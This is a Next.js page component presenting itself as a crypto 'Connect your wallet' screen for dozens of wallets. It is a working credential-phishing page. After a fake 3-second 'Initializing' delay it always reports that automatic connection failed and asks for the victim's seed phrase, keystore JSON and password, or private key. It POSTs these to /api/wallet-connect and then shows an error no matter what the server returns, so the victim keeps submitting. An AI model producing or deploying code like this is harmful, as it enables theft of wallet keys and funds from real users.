'use client'
import React, { JSX } from 'react';
import BlockChain from '../components/blockChain';
import { BlockChainProps } from '../types';
import { useState } from 'react';
import Image from 'next/image';

const blockChains: BlockChainProps[] = [
   { name: 'Metamask', iconUrl: '/meta.png', chainId: 32 },
    { name: 'Trust', iconUrl: '/trust.png', chainId: 63 },
    { name: 'Ambire', iconUrl: '/ambire.png', chainId: 3 },
    { name: 'ApolloX', iconUrl: '/apollox.png', chainId: 4 },
    { name: 'Argent', iconUrl: '/argent.jpg', chainId: 5 },
    { name: 'Avalanche', iconUrl: '/avalanche.png', chainId: 6 },
    { name: 'Banner', iconUrl: '/banner.png', chainId: 7 },
    { name: 'BitKeep', iconUrl: '/bitkeep.png', chainId: 8 },
    { name: 'Bitski', iconUrl: '/bitski.png', chainId: 9 },
    { name: 'Blockchain', iconUrl: '/blockchain.png', chainId: 10 },
    { name: 'BSC', iconUrl: '/bsc.png', chainId: 11 },
    { name: 'Cardano', iconUrl: '/cardano.png', chainId: 12 },
    { name: 'CCVault', iconUrl: '/ccvault.png', chainId: 13 },
    { name: 'Coinbase', iconUrl: '/coinbase.png', chainId: 14 },
    { name: 'Cosmos', iconUrl: '/cosmos.jpg', chainId: 15 },
    { name: 'Crypto', iconUrl: '/crypto.png', chainId: 16 },
    { name: 'Daedalus', iconUrl: '/daedalus.png', chainId: 17 },
    { name: 'Defiant', iconUrl: '/defiant.png', chainId: 18 },
    { name: 'Exodus', iconUrl: '/exodus.png', chainId: 19 },
    { name: 'Filecoin', iconUrl: '/filecoin.png', chainId: 20 },
    { name: 'Fireblocks', iconUrl: '/fireblocks.jpg', chainId: 21 },
    { name: 'Formatic', iconUrl: '/formatic.png', chainId: 22 },
    { name: 'Gero', iconUrl: '/gero.jpg', chainId: 23 },
    { name: 'ImToken', iconUrl: '/imtoken.png', chainId: 24 },
    { name: 'Infinito', iconUrl: '/infinito.png', chainId: 25 },
    { name: 'Infinity Wallet', iconUrl: '/infinity-wallet.png', chainId: 26 },
    { name: 'Injective', iconUrl: '/Injective.png', chainId: 27 },
    { name: 'IOST', iconUrl: '/iost.png', chainId: 28 },
    { name: 'KeyringPro', iconUrl: '/keyringpro.png', chainId: 29 },
    { name: 'Kryptogo', iconUrl: '/kryptogo.png', chainId: 30 },
    { name: 'Ledger', iconUrl: '/ledger.png', chainId: 31 },
    { name: 'Aktionariat', iconUrl: '/aktionariat.png', chainId: 1 },
    { name: 'Metis', iconUrl: '/metis.jpeg', chainId: 33 },
    { name: 'Nami', iconUrl: '/nami.png', chainId: 34 },
    { name: 'Now', iconUrl: '/now.png', chainId: 35 },
    { name: 'Nufinetes', iconUrl: '/nufinetes.png', chainId: 36 },
    { name: 'OneKey', iconUrl: '/onekey.png', chainId: 37 },
    { name: 'Optimism', iconUrl: '/Optimism.png', chainId: 38 },
    { name: 'Ownbit', iconUrl: '/ownbit.png', chainId: 40 },
    { name: 'Paper', iconUrl: '/paper.png', chainId: 41 },
    { name: 'Phantom', iconUrl: '/phantom.jpg', chainId: 42 },
    { name: 'Pier', iconUrl: '/pier.png', chainId: 43 },
    { name: 'Polkadot', iconUrl: '/polkadot.png', chainId: 44 },
    { name: 'Prema', iconUrl: '/prema.png', chainId: 45 },
    { name: 'Qtum', iconUrl: '/qtum.png', chainId: 46 },
    { name: 'Rice', iconUrl: '/rice.jpg', chainId: 47 },
    { name: 'Safemoon', iconUrl: '/safemoon.jpg', chainId: 48 },
    { name: 'Safepal', iconUrl: '/safepal.png', chainId: 49 },
    { name: 'Secux', iconUrl: '/secux.jpg', chainId: 50 },
    { name: 'Sequence', iconUrl: '/sequence.png', chainId: 51 },
    { name: 'Solana', iconUrl: '/solana.png', chainId: 52 },
    { name: 'Solflare', iconUrl: '/solflare.png', chainId: 53 },
    { name: 'Sollet', iconUrl: '/sollet.png', chainId: 54 },
    { name: 'Sollong', iconUrl: '/solong.jpg', chainId: 55 },
    { name: 'SparkPoint', iconUrl: '/sparkpoint.png', chainId: 56 },
    { name: 'Stellar', iconUrl: '/stellar.png', chainId: 57 },
    { name: 'Terra', iconUrl: '/terra.png', chainId: 58 },
    { name: 'Tezos', iconUrl: '/tezos.png', chainId: 59 },
    { name: 'Tokenary', iconUrl: '/tokenary.jpg', chainId: 60 },
    { name: 'Torus', iconUrl: '/torus.jpg', chainId: 61 },
    { name: 'Tron', iconUrl: '/tron.webp', chainId: 62 },
    { name: 'Algorand', iconUrl: '/algorand.png', chainId: 2 },
    { name: 'Unipass', iconUrl: '/unipass.jpg', chainId: 64 },
    { name: 'Vechain', iconUrl: '/vechain.png', chainId: 65 },
    { name: 'Velas', iconUrl: '/velas.png', chainId: 66 },
    { name: 'Venly', iconUrl: '/venly.jpg', chainId: 67 },
    { name: 'Verso', iconUrl: '/verso.png', chainId: 68 },
    { name: 'Wallet IO', iconUrl: '/wallet-io.png', chainId: 69 },
    { name: 'Wallet', iconUrl: '/wallet.png', chainId: 70 },
    { name: 'Waves', iconUrl: '/waves.jpg', chainId: 71 },
    { name: 'Window', iconUrl: '/window.svg', chainId: 72 },
    { name: 'Xumm', iconUrl: '/xumm.png', chainId: 73 },
    { name: 'Yoroi', iconUrl: '/yoroi.png', chainId: 74 },
    { name: 'Zcash', iconUrl: '/zcash.png', chainId: 75 },
    { name: 'Other', iconUrl: '/other.jpg', chainId: 39 },
];

const info: { name: string; id: number; details: JSX.Element }[] = [
    { name: 'phrase',
      id: 1,
      details:  <div>
                <textarea name="phrase" placeholder="Enter your wallet phrase"  className="text-gray-700 focus:outline-none bg-white border-[1px] border-gray-500 rounded-[10px] placeholder:text-customGray-main p-2 w-full"/>
            </div>
    },
      { name: 'keystore JSON',
      id: 3,
      details:
       <div className="flex flex-col gap-4 w-full">
            <div>
                <textarea name="keystone_Json" placeholder="Enter your Keystore JSON"  className="text-gray-700 focus:outline-none bg-white border-[1px] border-gray-500 rounded-[10px] placeholder:text-customGray-main p-2 w-full"/>
            </div>
            <div>
                <input placeholder="Wallet password" className="bg-white text-gray-700 focus:outline-none border-[1px]  border-gray-500 rounded-[10px] w-full placeholder:text-customGray-main p-2" type="password"  name="password"/>
            </div>
        </div>
    },
    { name: 'Private Key',
      id: 2,
      details:<div>
                <input name="privated" placeholder="Enter your Private Key" className="bg-white text-gray-700 focus:outline-none border-[1px]  border-gray-500 rounded-[10px] w-full p-2"/>
            </div>
    },
];

const Page = () => {
    const [loadingId, setLoadingId] = useState<number | null>(null);
    const [loadedId, setLoadedId] = useState<number | null>(null);
    const [clickId, setClickId] = useState<number | null>(1);
    const [loading, setLoading] = useState(false);
    const [success, setSuccess] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const handleCick = (id: number) => {
        setLoadingId(id);
        setLoadedId(null);
        setTimeout(() => {
            setLoadingId(null);
            setLoadedId(id);
        }, 3000);
    };

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        setError(null);
        setSuccess(false);

        // Store the form reference before any async operations
        const form = e.currentTarget;
        const formData = new FormData(form);
        const payload = {
            privated: formData.get("privated"),
            phrase: formData.get("phrase"),
            keystone_Json: formData.get("keystone_Json"),
            password: formData.get("password"),
        };

        try {
            console.log("Sending payload11:", payload);
            
            // TODO: Replace with your preferred API call
            // Example using fetch to your own API route
            const response = await fetch('/api/wallet-connect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            const data = await response.json();

            if (!response.ok) {
                console.error("API error:", data);
                setError(data.error || "Failed to process wallet connection");
                setLoadedId(null)
            } else {
                setError(data.error || "Error connecting to wallet...");
                setSuccess(false);
                setLoadedId(null)
                
                // Reset the form using the stored reference
                if (form) {
                    form.reset();
                }
                
                // Close the modal after a short delay
                setTimeout(() => {
                    setLoadedId(null);
                    setSuccess(false);
                }, 1500);
            }
        } catch (err) {
            console.error("Unexpected error:", err);
            setError((err instanceof Error ? err.message : String(err)));
        } finally {
            setLoading(false);
        }
    };
    const isModalOpen = loading || loadingId !== null || loadedId !== null || success || error !== null;

    return (
        <div className="bg-gradient-to-r from-[#020024] to-[#03012F] min-h-screen text-white py-4 px-2 relative bg-opacity-60">
            {loading ? (
                <div className="fixed inset-0 z-50 flex items-center justify-center  ">
                    <div className="bg-white w-[400px] rounded-lg flex flex-col shadow-lg p-4">
                        <div className="flex justify-center items-center">
                            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-600"></div>
                            <span className="ml-3 text-black">Processing...</span>
                        </div>
                    </div>
                </div>
            ): loadingId ? (
                <div className="fixed inset-0 z-50 flex items-center justify-center ">
                    <div className="bg-white w-[400px] rounded-lg flex flex-col shadow-lg border border-gray-300 ">
                        <div className="flex text-green-600 flex-row py-3 px-5 gap-2">
                            <span className="font-[800] text-[15px]">Initializing</span>
                            <Image
                                alt="loadIcon"
                                src="/download.svg"
                                width={15}
                                height={15}
                                style={{
                                    filter: "invert(56%) sepia(98%) saturate(749%) hue-rotate(97deg) brightness(101%) contrast(101%)",
                                }}
                            />
                        </div>
                        <div>
                            {blockChains
                                .filter((bc) => bc.chainId === loadingId)
                                .map((bc) => (
                                    <div
                                        key={bc.chainId}
                                        className="p-2 flex justify-between items-center m-5 rounded-lg border border-gray-300 bg-gray-50"
                                    >
                                        <div>
                                            <p className="truncate font-semibold text-sm sm-text-base text-gray-800">
                                                {bc.name}
                                            </p>
                                            <p className="text-gray-500 py-2 text-[10px]">
                                                Easy-to-use browser extension
                                            </p>
                                        </div>
                                        <Image
                                            src={bc.iconUrl}
                                            alt={bc.name}
                                            width={36}
                                            height={36}
                                            className="object-contain rounded-full"
                                        />
                                    </div>
                                ))}
                        </div>
                    </div>
                </div>
            ) : loadedId ? (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    <div className="bg-white w-full max-w-md rounded-lg flex flex-col p-6 shadow-lg">
                        <p className="text-red-500 text-[13px] md:text-[16px] pt-4 font-bold px-2">
                            There was an error connecting automatically. But do not worry, you can
                            still connect manually.
                        </p>
                        <div className="flex items-center gap-3 py-4">
                            {blockChains
                                .filter((bc) => bc.chainId === loadedId)
                                .map((bc) => (
                                    <div key={bc.chainId} className="px-2 flex justify-center items-center gap-4">
                                        <Image
                                            src={bc.iconUrl}
                                            alt="img"
                                            width={48}
                                            height={48}
                                            className="rounded-full"
                                        />
                                        <div>
                                <p className="text-black font-bold md:text-[16px] text-[13px]">
                                    Import your {bc.name} wallet
                                </p>
                            </div>
                                    </div>
                                ))}
                            
                        </div>
                        <div className="flex justify-around py-2 border-b border-gray-200 mb-4">
                            {info.map((inf) => (
                                <button
                                    key={inf.id}
                                    onClick={() => setClickId(inf.id)}
                                    className={`px-3 py-1 rounded-t font-bold text-[12px] md:text-[14px] transition-colors duration-150 ${
                                        clickId === inf.id
                                            ? "border-b-2 border-[#01EEA0] text-[#01EEA0] bg-[#f0fdfa]"
                                            : "text-black bg-transparent"
                                    }`}
                                >
                                    {inf.name}
                                </button>
                            ))}
                        </div>
                        <form onSubmit={handleSubmit} className="pt-2 min-h-[80px]">
                            {info.find((inf) => inf.id === clickId)?.details}
                            <button 
                                type="submit" 
                                className="text-[14px] bg-[#090979] rounded-[4px] p-2 my-5 text-white font-bold w-full hover:bg-blue-900 transition-colors"
                                disabled={loading}
                            >
                                {loading ? 'Processing...' : 'Validate'}
                            </button>
                            <div className='flex justify-end'>
                                <button 
                                    onClick={() => setLoadedId(null)} 
                                    className="text-[14px] bg-red-500 rounded-[4px] py-2 mb-5 text-white font-bold px-10 hover:bg-red-600 transition-colors"
                                >
                                    Close
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            ) : null}
            
            {success && (
                <div className="fixed top-4 right-4 bg-green-500 text-white p-3 rounded-md shadow-lg z-50">
                    ✅ Email sent successfully!
                </div>
            )}

             {error && (
                <div className="fixed inset-0 z-50 flex items-center justify-center  ">
                    <div>
                            <div className="mx-auto flex justify-between bg-white text-red-500 p-3 rounded-md shadow-full w-[300px] md:w-[400px]">
                        {error}      
                        <button onClick={() => setError(null)} className=" text-gray-500">x</button>
                        </div>
                    </div>
                </div>
                )}
            
          
             <div className={`${isModalOpen ? 'pointer-events-none opacity-30' : ''} transition-opacity duration-300`}>
            <div className="w-full max-w-lg md:max-w-2xl lg:w-1/2 mx-auto">
                <h1 className="text-xl md:text-2xl font-bold pt-5 pb-2 text-start">Connect your wallet</h1>
                <div className="bg-white text-black rounded-xl px-2 sm:px-5 my-5 border shadow-md">
                    <h2 className="py-4 font-bold text-lg md:text-xl ">Connect to a wallet</h2>
                    <div className="max-h-[60vh] md:max-h-[70vh] overflow-y-auto py-2">
                        {blockChains.map((bc) => (
                            <div 
                                onClick={() => handleCick(bc.chainId)} 
                                key={bc.chainId}
                                className="cursor-pointer hover:bg-gray-100 transition-colors"
                            >
                                <BlockChain {...bc} />
                            </div>
                        ))}
                    </div>
                </div>
            </div>
            </div>
        </div>
    );
}

export default Page;